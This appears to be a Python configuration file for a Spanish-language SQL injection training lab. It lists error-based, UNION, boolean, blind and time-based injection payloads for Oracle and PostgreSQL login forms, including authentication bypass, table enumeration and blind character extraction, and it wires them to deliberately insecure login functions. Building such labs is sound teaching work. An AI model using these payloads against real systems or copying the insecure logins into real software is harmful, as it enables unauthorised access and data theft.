from setupOracle import *
from setupPostgreSQL import *

# Diccionario de inyecciones SQL
sql_injections = {
    "database_error": {
        "title": "Database-Errors SQL Injection",
        "description": """
            <p>Utiliza los mensajes de error devueltos por la base de datos para extraer información confidencial.
            Este tipo de inyección se aprovecha de mensajes de error explícitos en las consultas SQL.</p>
        """,
        "credenciales":[
            {
                # Login sin credenciales válidas
                "nombre":"Login sin credenciales válidas",
                "usuario":"cualquier_input",
                "password":"cualquier_input' OR 1=1 --"
            },
            {
                # Obtener informacion sobre la existencia de tablas en la BD
                "nombre":"Informacion sobre las tablas",
                "usuario":"' OR 1=(SELECT * FROM tabla_inexistente) --",
                "password":"cualquier_input"
            },
            {
                # Obtener informacion sobre columnas en una tabla existente
                "nombre":"Informacion sobre las columnas de una tabla",
                "usuario":"' OR 1=(SELECT columna_inexistente FROM Usuarios) --",
                "password":"cualquier_input"
            },
            {
                # Obtener informacion sobre el SGBD al probar si la funcion version() es valida en el SGBD en el que se esta trabajando (funciona en PostgreSQL y MySQL)
                "nombre":"Informacion sobre el SGBD",
                "usuario":"' OR version() = 'PostgreSQL' --",
                "password":"cualquier_input"
            }
        ],
        "route_oracle": "login_oracle_database_error",
        "route_postgres": "login_postgres_database_error",
        "function_oracle": login_inseguro_errors_oracle,
        "function_postgres": login_inseguro_errors_postgresql
    },
    "server_error": {
        "title": "Server-Errors SQL Injection",
        "description": """
            <p>Utiliza los mensajes de error devueltos por el servidor para obtener información sobre la base de datos
            y realizar inyecciones de manera eficaz.</p>
        """,
        "credenciales":[],
        "usuario": "admin",
        "clave": "admin",
        "route_oracle": "login_oracle_server_error",
        "route_postgres": "login_postgres_server_error",
        "function_oracle": login_inseguro_errors_oracle,
        "function_postgres": login_inseguro_errors_postgresql
    },
    "union": {
        "title": "UNION-Attack SQL Injection",
        "description": """
            <p>Combina dos o más consultas usando la palabra clave UNION para obtener resultados adicionales de la base de datos,
            lo cual permite acceder a datos adicionales en el mismo conjunto de resultados.</p>
        """,
        "credenciales":[
            {
                "nombre":"Login sin credenciales válidas",
                "usuario":"cualquier_input",
                "password":"cualquier_input' OR 1=1 --"
            },
            {
                "nombre":"Nombre de la BD (Oracle)",
                "usuario":"cualquier_input",
                "password":"cualquier_input' UNION SELECT 1, ora_database_name, NULL AS nombre_bd FROM dual --"
            },
            {
                "nombre":"Versión de la BD (Oracle)",
                "usuario":"cualquier_input",
                "password":"cualquier_input' UNION SELECT NULL, banner, NULL FROM v$version WHERE banner LIKE 'Oracle%' --"
            },
            {
                "nombre":"Nombre de la BD (PostgreSQL)",
                "usuario":"cualquier_input",
                "password":"cualquier_input' UNION SELECT current_database() AS nombre_bd; --"
            },
            {
                "nombre":"Versión de la BD (PostgreSQL)",
                "usuario":"cualquier_input",
                "password":"cualquier_input' UNION SELECT NULL, version(), NULL; --"
            },
            {
                "nombre":"Todas las tablas en la BD (Oracle)",
                "usuario":"cualquier_input",
                "password":"cualquier_input' UNION SELECT 1, OWNER, TABLE_NAME FROM all_tables WHERE OWNER='SYSTEM' -- AND password = 'cualquier_input'"
            },
            {
                "nombre":"Todas las tablas en la BD (PostgreSQL)",
                "usuario":"cualquier_input",
                "password":"cualquier_input' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema = 'public'; --"
            },
            {
                "nombre":"Todas las tablas en la BD (Oracle Filtrado)",
                "usuario":"cualquier_input",
                "password":"cualquier_input' UNION SELECT 1, OWNER, TABLE_NAME FROM all_tables WHERE owner = 'SYSTEM' AND TABLE_NAME NOT LIKE '%$%' AND TABLE_NAME NOT LIKE 'SYS%' AND TABLE_NAME NOT LIKE 'LOGMNR%' --"
            }
        ],
        "route_oracle": "login_oracle_union",
        "route_postgres": "login_postgres_union",
        "function_oracle": login_inseguro_base_oracle,
        "function_postgres": login_inseguro_base_postgresql
    },
    "boolean": {
        "title": "Boolean-Based SQL Injection",
        "description": """
            <p>Emplea consultas booleanas para determinar si ciertas condiciones son verdaderas o falsas, sin necesidad de mensajes de error.
            Es útil para inferir datos en situaciones donde los errores están limitados.</p>
        """,
        "credenciales":[],
        "usuario": "admin",
        "clave": "admin",
        "route_oracle": "login_oracle_boolean",
        "route_postgres": "login_postgres_boolean",
        "function_oracle": login_inseguro_base_oracle,
        "function_postgres": login_inseguro_base_postgresql
    },
    "blind_boolean": {
        "title": "Blind Boolean-Based SQL Injection",
        "is_blind": True,
        "description": """
            <p>Evalúa los resultados en función de respuestas booleanas sin revelar datos directamente. Es útil cuando los mensajes de error
            están deshabilitados, ya que permite al atacante inferir información a través de condiciones booleanas.</p>
        """,
        "credenciales":[ # usuario/password en este caso serían payload que devuelva True y False respectivamente
            {
                "nombre":"Entendiendo la inyección",
                "usuario":"d382yd8n21df4314fn817yf6834188ls023d8d' AND '1'='1",
                "password":"d382yd8n21df4314fn817yf6834188ls023d8d' AND '1'='2"
            },
            {
                "nombre":"Sacando la longitud de un campo (Oracle)",
                "usuario":"d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (LENGTH(username) = 5) THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --",
                "password":"d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (LENGTH(username) = 33) THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --"
            },
            {
                "nombre":"Sacando la longitud de un campo (PostgreSQL)",
                "usuario":"",
                "password":""
            },
            {
                "nombre":"Sacando un carácter de un campo (Oracle)",
                "usuario":"d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(username, 1, 1) = 'a') THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --",
                "password":"d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(username, 1, 1) = 'z') THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --"
            },
            {
                "nombre":"Sacando un carácter de un campo (PostgreSQL)",
                "usuario":"",
                "password":""
            }
        ],
        "usuario": "admin",
        "clave": "admin",
        "route_oracle": "login_oracle_blind_boolean",
        "route_postgres": "login_postgres_blind_boolean",
        "function_oracle": login_inseguro_blind_no_cookie_oracle,
        "function_postgres": login_inseguro_blind_no_cookie_postgresql
    },
    "time_based": {
        "title": "Time-Based Blind SQL Injection",
        "is_blind": True,
        "description": """
            <p>Evalúa el tiempo de respuesta del servidor para inferir si la inyección es exitosa o no. Es útil en aplicaciones
            que no revelan errores ni permiten consultas booleanas.</p>
        """,
        "credenciales":[],
        "usuario": "admin",
        "clave": "admin",
        "route_oracle": "login_oracle_time_based",
        "route_postgres": "login_postgres_time_based",
        "function_oracle": login_inseguro_blind_oracle,
        "function_postgres": login_inseguro_blind_postgresql
    }
}